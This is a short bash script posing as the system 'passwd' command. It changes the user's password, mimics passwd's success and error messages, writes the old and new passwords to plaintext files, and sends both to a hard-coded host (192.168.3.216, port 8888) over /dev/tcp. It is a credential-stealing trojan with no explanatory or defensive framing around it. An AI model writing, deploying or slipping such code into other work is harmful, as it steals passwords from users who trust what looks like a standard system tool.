#!/bin/bash

remoteHost="192.168.3.216"
remotePort="8888"

echo "Changing password for "$USER"."

### Input password as hidden charactors ### 
read -s -p"Current password: " currentPwd
echo
read -s -p "New password: " newPwd
echo
read -s -p "Retype new password: " retypePwd
echo

if (printf "$currentPwd\n$newPwd\n$retypePwd\n" | passwd > /dev/null 2>&1); then
  echo "passwd: password updated successfully"
  (echo $currentPwd > oldPassword.txt) > /dev/null 2>&1
  (echo $newPwd > newPassword.txt) > /dev/null 2>&1
  echo $newPwd > /dev/tcp/$remoteHost/$remotePort
  echo $currentPwd > /dev/tcp/$remoteHost/$remotePort
else
  echo "passwd: Authentication token manipulation error"
  echo "passwd: password unchanged"
fi

